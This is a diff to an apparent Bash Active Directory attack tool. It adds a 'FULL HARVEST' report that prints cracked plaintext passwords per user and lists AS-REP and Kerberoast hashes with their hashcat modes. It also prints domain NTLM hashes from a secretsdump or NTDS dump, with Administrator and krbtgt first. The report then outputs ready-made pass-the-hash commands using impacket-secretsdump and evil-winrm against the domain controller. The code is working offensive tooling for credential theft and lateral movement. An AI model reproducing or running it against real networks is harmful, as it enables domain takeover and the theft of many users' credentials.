@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.3.1"
+readonly VERSION="1.4.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2768,7 +2768,52 @@ final_summary() {
         fi
         ok "Full map saved → credential_map.txt / valid_creds_map.txt"
     fi
-    echo
+
+    # ----- FULL HARVEST: everything recovered, in detail + colour -----------
+    local dd=""
+    [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -qE ':::' "$OUTDIR/secretsdump.txt" 2>/dev/null && dd="$OUTDIR/secretsdump.txt"
+    [[ -z "$dd" && -s "$OUTDIR/ntds_local.txt" ]] && grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null && dd="$OUTDIR/ntds_local.txt"
+
+    if [[ -s "$OUTDIR/found_passwords.txt" || -s "$OUTDIR/asrep_hashes.txt" || -s "$OUTDIR/kerberoast_hashes.txt" || -n "$dd" ]]; then
+        section "FULL HARVEST · EVERYTHING RECOVERED"
+
+        if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
+            echo -e "  ${C_BOLD}${C_GREEN}» Plaintext passwords${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/found_passwords.txt" | grep -c . ) unique)${C_RESET}"
+            sort -u "$OUTDIR/found_passwords.txt" | while IFS= read -r p; do
+                [[ -z "$p" ]] && continue
+                local who; who=$(grep -F ":$p" "$OUTDIR/valid_creds_map.txt" 2>/dev/null | head -1 | awk '{print $1}')
+                if [[ -n "$who" ]]; then echo -e "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
+                else echo -e "      ${C_GREEN}$p${C_RESET}"; fi
+            done
+        fi
+
+        if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
+            echo -e "  ${C_BOLD}${C_YELLOW}» AS-REP roastable${C_RESET} ${C_DIM}($(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt") — hashcat -m 18200)${C_RESET}"
+            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5asrep\$[0-9]+\$\K[^@:]+')
+                echo -e "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5asrep "$OUTDIR/asrep_hashes.txt")
+        fi
+
+        if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -qi krb5tgs "$OUTDIR/kerberoast_hashes.txt"; then
+            echo -e "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
+            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
+                echo -e "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
+        fi
+
+        if [[ -n "$dd" ]]; then
+            echo -e "  ${C_BOLD}${C_RED}» DOMAIN NTLM DUMP${C_RESET} ${C_DIM}($(grep -cE ':::' "$dd") accounts — Pass-the-Hash ready)${C_RESET}"
+            # high-value first (Administrator, krbtgt), then the rest
+            while IFS= read -r line; do
+                local u nt lc; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4); lc="${u,,}"
+                case "$lc" in
+                    *administrator|*krbtgt|*'$') echo -e "      ${C_RED}${C_BOLD}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
+                    *) echo -e "      ${C_CYAN}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${nt}${C_RESET}" ;;
+                esac
+            done < <(grep -E ':::' "$dd" | grep -iE '(administrator|krbtgt):' ; grep -E ':::' "$dd" | grep -ivE '(administrator|krbtgt):')
+            local ah; ah=$(grep -iE '^[^:]*administrator:' "$dd" | head -1 | cut -d: -f4)
+            [[ -n "$ah" ]] && echo -e "      ${C_BOLD}${C_RED}↳ PtH:${C_RESET} ${C_DIM}impacket-secretsdump -hashes :$ah Administrator@$DC_IP  ·  evil-winrm -i $DC_IP -u Administrator -H $ah${C_RESET}"
+        fi
+        echo
+    fi
 
     # Build the human report + interactive graph, THEN tidy the loot dir
     # (gen_report/graph read files while they're still at the root).
